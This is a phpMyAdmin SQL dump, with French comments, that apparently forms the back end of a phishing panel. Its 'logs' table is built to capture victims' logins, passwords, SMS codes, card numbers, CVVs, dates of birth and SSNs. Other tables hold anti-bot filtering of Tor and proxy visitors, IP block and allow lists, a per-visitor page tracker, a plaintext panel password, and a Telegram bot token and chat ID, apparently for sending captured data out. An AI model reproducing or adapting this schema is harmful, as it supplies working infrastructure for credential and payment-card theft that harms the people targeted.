-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1
-- Généré le : mer. 18 déc. 2024 à 14:04
-- Version du serveur :  10.4.17-MariaDB
-- Version de PHP : 8.0.2

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `dash`
--

-- --------------------------------------------------------

--
-- Structure de la table `antibots`
--

CREATE TABLE `antibots` (
  `id` int(11) NOT NULL,
  `is_tor` int(11) NOT NULL,
  `is_icloud_relay` int(11) NOT NULL,
  `is_proxy` int(11) NOT NULL,
  `is_known_abuser` int(11) NOT NULL,
  `is_datacenter` int(11) NOT NULL,
  `Ultra_Protection` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `antibots`
--

INSERT INTO `antibots` (`id`, `is_tor`, `is_icloud_relay`, `is_proxy`, `is_known_abuser`, `is_datacenter`, `Ultra_Protection`) VALUES
(1, 1, 1, 1, 1, 1, 1);

-- --------------------------------------------------------

--
-- Structure de la table `black`
--

CREATE TABLE `black` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Structure de la table `country`
--

CREATE TABLE `country` (
  `id` int(11) NOT NULL,
  `country` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Structure de la table `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `fname` varchar(255) DEFAULT NULL,
  `lname` varchar(255) DEFAULT NULL,
  `adr` varchar(255) DEFAULT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `zip` varchar(255) DEFAULT NULL,
  `login` varchar(255) DEFAULT NULL,
  `pw` varchar(255) DEFAULT NULL,
  `sms` varchar(255) DEFAULT NULL,
  `cnumber` varchar(255) DEFAULT NULL,
  `cdate` varchar(255) DEFAULT NULL,
  `ccv` varchar(255) DEFAULT NULL,
  `dob` varchar(255) DEFAULT NULL,
  `ssn` varchar(255) DEFAULT NULL,
  `cholder` varchar(255) DEFAULT NULL,
  `auth` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `logs`
--

INSERT INTO `logs` (`id`, `fname`, `lname`, `adr`, `phone`, `city`, `zip`, `login`, `pw`, `sms`, `cnumber`, `cdate`, `ccv`, `dob`, `ssn`, `cholder`, `auth`) VALUES
(1, 'darkness', 'light', 'light', '123456789', 'darkness', 'darkness', 'darkness light', 'darkness password', NULL, NULL, NULL, NULL, '1889-03-07', NULL, NULL, '102.106.187.245');

-- --------------------------------------------------------

--
-- Structure de la table `panel`
--

CREATE TABLE `panel` (
  `onof` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `panel`
--

INSERT INTO `panel` (`onof`) VALUES
(1);

-- --------------------------------------------------------

--
-- Structure de la table `password`
--

CREATE TABLE `password` (
  `pw` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `password`
--

INSERT INTO `password` (`pw`) VALUES
('Darkness@1234');

-- --------------------------------------------------------

--
-- Structure de la table `sq`
--

CREATE TABLE `sq` (
  `id` int(11) NOT NULL,
  `sq` varchar(255) NOT NULL,
  `auth` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Structure de la table `telegram`
--

CREATE TABLE `telegram` (
  `bot` varchar(255) DEFAULT NULL,
  `chat` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `telegram`
--

INSERT INTO `telegram` (`bot`, `chat`) VALUES
('6871065209:AAHEux4TOyYRrDrXWaPzHJEU8wJsW-HykAE', '-1002476812677');

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `curentPage` varchar(255) DEFAULT NULL,
  `auth` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `curentPage`, `auth`) VALUES
(12, 'login', '102.106.187.245'),
(13, 'login', '102.109.62.36'),
(14, 'login', '102.159.25.130'),
(17, 'order', '197.3.224.130');

-- --------------------------------------------------------

--
-- Structure de la table `white`
--

CREATE TABLE `white` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `black`
--
ALTER TABLE `black`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `country`
--
ALTER TABLE `country`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `sq`
--
ALTER TABLE `sq`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `white`
--
ALTER TABLE `white`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `black`
--
ALTER TABLE `black`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT pour la table `country`
--
ALTER TABLE `country`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT pour la table `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT pour la table `sq`
--
ALTER TABLE `sq`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT pour la table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT pour la table `white`
--
ALTER TABLE `white`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
